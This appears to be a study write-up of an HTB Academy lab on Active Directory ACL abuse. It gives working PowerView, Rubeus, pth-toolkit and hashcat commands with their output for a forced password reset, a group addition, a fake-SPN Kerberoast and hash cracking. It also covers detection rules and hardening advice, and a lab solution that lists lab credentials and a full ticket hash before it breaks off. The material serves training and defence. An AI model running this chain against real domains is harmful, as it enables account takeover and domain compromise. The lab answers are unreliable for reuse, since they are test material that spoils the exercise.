# 🎯 **ACL Abuse Tactics**

## 🎭 **HTB Academy: Active Directory Enumeration & Attacks**

### 📍 **Overview**

ACL Abuse Tactics represents the **practical exploitation phase** of Access Control List attacks in Active Directory environments. This module demonstrates how to execute a complete **multi-step attack chain** from initial user compromise to domain-level privilege escalation, utilizing misconfigured ACL permissions discovered during enumeration.

---

### 🔗 **Attack Chain Overview**

**Complete Attack Path:**
```
wley (compromised) → damundsen (password change) → Help Desk Level 1 (group membership) → Information Technology (nested groups) → adunn (GenericAll) → DCSync capabilities
```

**Attack Flow:**
1. **Initial Access**: `wley` user (hash cracked from Responder)
2. **Password Change**: Force change `damundsen` password using User-Force-Change-Password rights
3. **Group Membership**: Add `damundsen` to "Help Desk Level 1" group using GenericWrite
4. **Nested Privileges**: Inherit "Information Technology" group membership
5. **Target Control**: Leverage GenericAll over `adunn` user
6. **Final Goal**: DCSync attack for domain compromise

---

## 🚀 **Step 1: Authentication Setup**

### **Creating PSCredential Objects**

**Initial wley Authentication:**
```powershell
# Create secure password object for wley user
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force

# Create credential object for wley
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

**Target Password Preparation:**
```powershell
# Create secure password for target user damundsen
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

### **Key Security Considerations**
- **PowerShell Logging**: Commands will be logged in PowerShell transcripts
- **Memory Exposure**: SecureString objects may be retrievable from memory
- **Process Monitoring**: Authentication attempts generate security events
- **Network Traffic**: LDAP modifications are observable

---

## 🔐 **Step 2: Password Manipulation Attack**

### **Leveraging User-Force-Change-Password Rights**

**PowerView Password Change:**
```powershell
# Navigate to tools directory
cd C:\Tools\

# Import PowerView module
Import-Module .\PowerView.ps1

# Force password change for damundsen user
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

**Expected Output:**
```powershell
VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
```

### **Alternative Linux Approach**
```bash
# Using pth-toolkit from Linux attack host
pth-net rpc password "damundsen" "Pwn3d_by_ACLs!" -U "INLANEFREIGHT/wley%PASSWORD" -S domain_controller_ip
```

### **Attack Validation**
```powershell
# Test new credentials
$TestCred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $damundsenPassword)
Get-DomainUser -Identity damundsen -Credential $TestCred
```

---

## 👥 **Step 3: Group Membership Manipulation**

### **Preparing damundsen Credentials**

```powershell
# Create credential object for newly compromised damundsen account
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

### **Pre-Attack Group Enumeration**

**Current "Help Desk Level 1" Members:**
```powershell
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

**Sample Output:**
```powershell
CN=Stella Blagg,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Marie Wright,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Jerrell Metzler,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Evelyn Mailloux,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Juanita Marrero,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Joseph Miller,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Wilma Funk,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Maxie Brooks,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Scott Pilcher,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Orval Wong,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=David Werner,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Alicia Medlin,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Lynda Bryant,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Tyler Traver,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Maurice Duley,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=William Struck,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Denis Rogers,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Billy Bonds,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Gladys Link,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Gladys Brooks,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Margaret Hanes,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Michael Hick,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Timothy Brown,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Nancy Johansen,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Valerie Mcqueen,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Dagmar Payne,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

### **Group Membership Addition Attack**

```powershell
# Add damundsen to Help Desk Level 1 group using GenericWrite rights
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

**Expected Output:**
```powershell
VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
```

### **Attack Validation**

```powershell
# Confirm successful group membership addition
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

MemberName
----------
busucher
spergazed
<SNIP>
damundsen    # ← NEW MEMBER ADDED
dpayne
```

### **Alternative Linux Approach**
```bash
# Using pth-toolkit for group membership modification
pth-net rpc group addmem "Help Desk Level 1" "damundsen" -U "INLANEFREIGHT/damundsen%Pwn3d_by_ACLs!" -S domain_controller_ip
```

---

## 🎯 **Step 4: Targeted Kerberoasting Attack**

### **Creating Fake SPN for adunn**

**Rationale:**
- `adunn` is an admin account that **cannot be interrupted**
- **GenericAll rights** allow SPN manipulation
- **Kerberoasting** provides offline password cracking
- More **stealthy** than direct password changes

**SPN Creation:**
```powershell
# Create fake SPN on adunn account using GenericAll rights
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

**Expected Output:**
```powershell
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
```

### **Kerberoasting Execution**

**Using Rubeus:**
```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

**Expected Output:**
```powershell
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : adunn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=adunn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : adunn
[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : notahacker/LEGIT
[*] PwdLastSet             : 3/1/2022 11:29:08 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$ <SNIP>
```

### **Alternative Linux Approach**
```bash
# Using targetedKerberoast for automated SPN management
python3 targetedKerberoast.py -d inlanefreight.local -u damundsen -p 'Pwn3d_by_ACLs!' --dc-ip 172.16.5.5 -t adunn
```

### **Hash Cracking with Hashcat**

```bash
# Extract hash to file
echo '$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$[HASH_DATA]' > adunn_tgs.txt

# Crack with Hashcat
hashcat -m 13100 -w 3 -O adunn_tgs.txt /usr/share/wordlists/rockyou.txt

# Alternative with rules
hashcat -m 13100 -w 3 -O adunn_tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## 🧹 **Step 5: Cleanup Procedures**

### **Critical Cleanup Order**

**⚠️ IMPORTANT:** Cleanup order matters! Remove SPN **before** removing group membership to maintain privileges.

**1. Remove Fake SPN:**
```powershell
# Remove fake SPN from adunn account
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

**Expected Output:**
```powershell
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'adunn'
```

**2. Remove Group Membership:**
```powershell
# Remove damundsen from Help Desk Level 1 group
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

**Expected Output:**
```powershell
VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Remove-DomainGroupMember] Removing member 'damundsen' from group 'Help Desk Level 1'
True
```

**3. Verify Removal:**
```powershell
# Confirm damundsen was removed from group
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName | ? {$_.MemberName -eq 'damundsen'} -Verbose
# Should return no results
```

**4. Password Reset Considerations:**
```powershell
# Note: Password reset requires knowledge of original password or client coordination
# Options:
# 1. Reset to known/original password if available
# 2. Coordinate with client for password reset
# 3. Document change for client to handle
```

### **Assessment Documentation Requirements**

**Critical Documentation:**
- **All password changes** made during assessment
- **Group membership modifications** 
- **SPN additions/removals**
- **Timestamps** of all modifications
- **Affected user accounts**
- **Cleanup actions performed**

**Client Notification:**
- Include **every modification** in final assessment report
- Provide **evidence** of cleanup procedures
- Document any **incomplete cleanup** with explanations
- Recommend **client verification** of all changes

---

## 🚨 **Detection and Remediation**

### **Event Monitoring**

#### **Key Event IDs:**

**Event ID 5136: Directory Service Object Modified**
- **What it detects**: ACL modifications, attribute changes
- **Location**: Security Event Log on Domain Controllers
- **Critical for**: Detecting ACL abuse attempts

**Event ID 4728: Member Added to Security-Enabled Global Group**
- **What it detects**: Group membership changes
- **Location**: Security Event Log on Domain Controllers
- **Critical for**: Monitoring privileged group additions

**Event ID 4732: Member Added to Security-Enabled Local Group**
- **What it detects**: Local group membership changes
- **Location**: Security Event Log on member servers
- **Critical for**: Local admin additions

### **Event Analysis Example**

**Viewing Event ID 5136:**
```powershell
# Search for recent 5136 events
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=5136; StartTime=(Get-Date).AddHours(-24)} | Select TimeCreated, Id, LevelDisplayName, Message
```

**SDDL Analysis:**
```powershell
# Convert SDDL to readable format for Event ID 5136
$SddlString = "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)..." # <SNIP>

ConvertFrom-SddlString $SddlString
```

**Readable Output:**
```powershell
Owner            : BUILTIN\Administrators
Group            : BUILTIN\Administrators
DiscretionaryAcl : {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT
                   AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions,
                   Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed
                   (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions,
                   WriteExtendedAttributes)...}
SystemAcl        : {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse),
                   BUILTIN\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), INLANEFREIGHT\Domain Users:
                   SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess
                   (Traverse)...}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
```

**Filtering for Suspicious ACEs:**
```powershell
# Filter DiscretionaryAcl for potential attack indicators
ConvertFrom-SddlString $SddlString | Select -ExpandProperty DiscretionaryAcl | Where-Object {$_.IdentityReference -like "*mrb3n*" -or $_.AccessControlType -eq "Allow" -and $_.ActiveDirectoryRights -like "*GenericWrite*"}
```

### **Advanced Detection Techniques**

#### **PowerShell Logging**
```powershell
# Enable PowerShell module logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 1

# Enable PowerShell script block logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
```

#### **Sysmon Configuration**
```xml
<!-- Sysmon Event ID 1: Process Creation -->
<RuleGroup name="PowerView Detection" groupRelation="or">
    <ProcessCreate onmatch="include">
        <CommandLine condition="contains">Set-DomainUserPassword</CommandLine>
        <CommandLine condition="contains">Add-DomainGroupMember</CommandLine>
        <CommandLine condition="contains">Set-DomainObject</CommandLine>
        <CommandLine condition="contains">serviceprincipalname</CommandLine>
    </ProcessCreate>
</RuleGroup>
```

### **Defensive Recommendations**

#### **1. ACL Auditing and Remediation**
```powershell
# Regular ACL audits using BloodHound
# Automated scanning with PowerView
Find-InterestingDomainAcl -ResolveGUIDs | Export-Csv -Path "ACL_Audit_$(Get-Date -Format 'yyyy-MM-dd').csv"

# Remove dangerous ACLs
# Example: Remove GenericAll from non-admin users
```

#### **2. Group Membership Monitoring**
```powershell
# Monitor critical groups
$CriticalGroups = @("Domain Admins", "Enterprise Admins", "Administrators", "Account Operators", "Backup Operators")

foreach ($Group in $CriticalGroups) {
    Get-ADGroupMember -Identity $Group | Export-Csv -Path "GroupMembership_$Group_$(Get-Date -Format 'yyyy-MM-dd').csv"
}
```

#### **3. Enable Advanced Audit Policy**
```cmd
# Enable directory service changes auditing
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable

# Enable directory service access auditing  
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable

# Enable account management auditing
auditpol /set /subcategory:"User Account Management" /success:enable /failure:enable
auditpol /set /subcategory:"Security Group Management" /success:enable /failure:enable
```

#### **4. Implement LAPS (Local Administrator Password Solution)**
```powershell
# Deploy LAPS to prevent local admin password reuse
Import-Module AdmPwd.PS

# Set LAPS password policy
Set-AdmPwdComputerSelfPermission -Identity "OU=Computers,DC=domain,DC=com"
```

#### **5. Regular BloodHound Analysis**
```bash
# Automated BloodHound data collection and analysis
python3 BloodHound.py -u serviceaccount -p password -d domain.local -dc dc.domain.local -c All

# Custom queries for ACL abuse detection
MATCH (u:User)-[r:GenericAll]->(t:User) WHERE u.name <> t.name RETURN u.name, t.name
MATCH (u:User)-[r:GenericWrite]->(g:Group) RETURN u.name, g.name
```

---

## 🎯 **HTB Academy Lab Solution**

### **Lab Question: "Set a fake SPN for the adunn account, Kerberoast the user, and crack the hash using Hashcat. Submit the account's cleartext password as your answer."**

**Complete Lab Workflow:**

#### **Step 1: Connect to Target**
```bash
# RDP to target machine
xfreerdp /v:10.129.123.157 /u:htb-student /p:Academy_student_AD!
```

#### **Step 2: Setup Attack Environment**
```powershell
# Navigate to tools and import PowerView
cd C:\Tools\
Import-Module .\PowerView.ps1

# Authenticate as wley (password obtained from previous modules)
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# Change damundsen password
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

# Create damundsen credential object
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $damundsenPassword)

# Add damundsen to Help Desk Level 1 group
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

#### **Step 3: Execute Kerberoasting Attack**
```powershell
# Create fake SPN on adunn account
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# Kerberoast adunn user with Rubeus
.\Rubeus.exe kerberoast /user:adunn /nowrap

# Copy the hash output for cracking
```

#### **Step 4: Crack Hash with Hashcat**
```bash
# On attacking machine (Linux)
# Save hash to file
echo '$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$[HASH_DATA]' > adunn_hash.txt

# Crack with Hashcat
hashcat -m 13100 -w 3 -O adunn_hash.txt /usr/share/wordlists/rockyou.txt

# Expected result: Password cracked
```

#### **Step 5: Cleanup**
```powershell
# Remove fake SPN
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

# Remove group membership
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

### **🔍 Complete HTB Academy Lab Execution**

**Target Details:**
- **Target IP**: `10.129.149.107`
- **RDP Credentials**: `htb-student:Academy_student_AD!`
- **wley Password**: `transporter@4` (obtained from previous modules)

#### **Step-by-Step Real Lab Commands:**

**1. RDP Connection:**
```bash
xfreerdp /v:10.129.149.107 /u:htb-student /p:Academy_student_AD!
# Click "OK" on Computer Access Policy prompt
# Close Server Manager
# Run PowerShell as Administrator
```

**2. Setup Attack Environment:**
```powershell
# Navigate to tools directory
cd C:\Tools\

# Create PSCredential for wley user
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# Create secure password for damundsen
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

# Import PowerView
Import-Module .\PowerView.ps1
```

**3. Password Change Attack:**
```powershell
# Force change damundsen password using wley credentials
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

**Real Output:**
```powershell
PS C:\Tools> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
```

**4. Group Membership Manipulation:**
```powershell
# Create damundsen credential object
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

# Add damundsen to Help Desk Level 1 group
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

**Real Output:**
```powershell
PS C:\Tools> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
```

**5. Verify Group Membership:**
```powershell
# Confirm damundsen was added successfully
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName | Select-String -Pattern "damundsen"
```

**Real Output:**
```powershell
PS C:\Tools> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName | Select-String -Pattern "damundsen"

@{MemberName=damundsen}
```

**6. Create Fake SPN:**
```powershell
# Set fake SPN on adunn account
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

**Real Output:**
```powershell
PS C:\Tools> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
```

**7. Kerberoast adunn:**
```powershell
# Extract TGS ticket for adunn
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

**Real Output:**
```powershell
PS C:\Tools> .\Rubeus.exe kerberoast /user:adunn /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : adunn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=adunn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : adunn
[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : notahacker/LEGIT
[*] PwdLastSet             : 3/1/2022 11:29:08 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$D4CAC857ED8F6B9BD4DF91E0DCA95AB1$B5B1908355B367E199B8CC4D6E34F6C83C7C49318DA7F3F8EC5342D025081C8A4B25B07C898F4A787A9B27342FBE0ADAC91DCBA6850E17452F5B6FD7599CE32AD5DA3F1C93A3B7DBB37D45941C3682A6BF301CC503D95063580B73EEA3C2DC11130C0DA7D9B4F3908B5D5EE3609B1C2CFD3050EC225F8774D86F92676A8209A875F3F7AE9C991628741FC93A727A2C4684181038A586328DF02E7F68C67E8CEE4E948A6FB57C3AB7419A24811E7E95BC1801BA5F70BB0A6464F6A9B9C9351D7A3C4259074B35E4FB82797957F34A314C3E6D0DE4C96A0BB52E8678686460742B10B8A1A25D0E2953B4712253CED0D13DAB9AFD8ABA8B4B338364F923F89C9167FE76C37F7527B8DDFD4C0BBFA53BE552B11272A81DF74D033D9B4FE9BDFA3296EFDD9E3301CBC8293401FCFF3B7694E8339D56C9E4BE5EBDE1DAD8706E25DD05E2851A1749235A3785658971A692B4F1740A69D2D2F66FA763D551ECBFEFFEB8FC54951FC756430C1E550FD0DD8F6900D2AF5BF5D381AC77454ACDB04779FCD2BDA3597D0B7C6A1E7A4C06D1637E81B3810A763086D69E8DF0F2D6E56B020EDA4CAB7EE4F3D61253529AC3F17C546FC6E5EEE484F8343BCC2D35A9406B93B64F6D31B5A649EAD1C9B6BC71DB2EC82CFE5DC77285CD5941DA79111A0D97EFE049270E4D470209FD92AA7331A7CAF734BE5D834C0D6E4F6BD23C9F7556008F7BCA7291567B4C3D9270AB3E190531D221029277E85D785B7D3850D8A9B03A03EAF7B6E1BB0FFA4EB476F433D032EA993EED03A14227BB4879B4FD76B579799CF7CB093EBE27B7CC21A92451E43C274CF26161BCFEA1DFCA8249F6D91FF7CF4CF33384EF1969409B65D5290B0991F9D34866CD0F38F0DF37E858CF78FFF6A4C1E5A0C84E8CC2E2340D7A5FBC61F3B836CDC7D7909279F1CBDBE84DD069808E1BFC7CD01CC9449B73705611FBFC5DDCCAA9CC308B2591B1AD9BB428956A4EB7A88B54273A5008D6F52A65A036D283111D539C2D19EE7611EE1822F1749E6173876D9107086C6A93265AB49ED9D463B76F03F579C8E99E9AB5899C5FA0D29BC7B73180444D101F7BA048E8309AED360D933CFF20561E5AF5D3F2F1049448D1C4BE2FF341992C9BF0A9232C2FEF51AAE507306B7B46DEC98652ECED93F787CBAD674F8B2ACC7909C914E995729FB476CA02C4FF90D9C146ADD22DB762BC183C00514B234032DF753C73FCD74B28A18EDA9516F2300D634E551828DEB8ECD26C14FFB8A6D9EAFBEAE9732E4E2DD767FC50CC7CD3CAF10C0DFB2FF3D9836CB79F9DD886EE7C95E85A75B1A70FB32C8527E99C3055CAEE0775F7375C00B1A207802F368981DD16197718884C48AEFC47CEAF0E46413CAAD45AF4F5D8478F65485E62A5655ABC9B35A38E24BDD8A426B0F1AC208DFEF8239E2EAB3C43B26FF4925B3FD6EB85C294D733EFF97E9DB6E50C0D0B398744B74A998FC01083DF41D7F6C26CF9F203E5ED0F7BE33E76EBAE2D27D4A282289B8718CE76E03DF0549005875111957FA0A28B85A869DD18F9774850DEC55142876391B3EC293EFADB2D32808CA89C91090DA1A8E569F50F7EDBF0036DBE732E776CED446EAB9704A1DE14C3BA17898381165852AE928A01FD158C4C77368B73A47FD3F6BF8A1884C09D
```

**8. Extract and Crack Hash:**
```bash
# On Pwnbox/attacking machine - save hash to file
echo '$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$D4CAC857ED8F6B9BD4DF91E0DCA95AB1$B5B1908355B367E199B8CC4D6E34F6C83C7C49318DA7F3F8EC5342D025081C8A4B25B07C898F4A787A9B27342FBE0ADAC91DCBA6850E17452F5B6FD7599CE32AD5DA3F1C93A3B7DBB37D45941C3682A6BF301CC503D95063580B73EEA3C2DC11130C0DA7D9B4F3908B5D5EE3609B1C2CFD3050EC225F8774D86F92676A8209A875F3F7AE9C991628741FC93A727A2C4684181038A586328DF02E7F68C67E8CEE4E948A6FB57C3AB7419A24811E7E95BC1801BA5F70BB0A6464F6A9B9C9351D7A3C4259074B35E4FB82797957F34A314C3E6D0DE4C96A0BB52E8678686460742B10B8A1A25D0E2953B4712253CED0D13DAB9AFD8ABA8B4B338364F923F89C9167FE76C37F7527B8DDFD4C0BBFA53BE552B11272A81DF74D033D9B4FE9BDFA3296EFDD9E3301CBC8293401FCFF3B7694E8339D56C9E4BE5EBDE1DAD8706E25DD05E2851A1749235A3785658971A692B4F1740A69D2D2F66FA763D551ECBFEFFEB8FC54951FC756430C1E550FD0DD8F6900D2AF5BF5D381AC77454ACDB04779FCD2BDA3597D0B7C6A1E7A4C06D1637E81B3810A763086D69E8DF0F2D6E56B020EDA4CAB7EE4F3D61253529AC3F17C546FC6E5EEE484F8343BCC2D35A9406B93B64F6D31B5A649EAD1C9B6BC71DB2EC82CFE5DC77285CD5941DA79111A0D97EF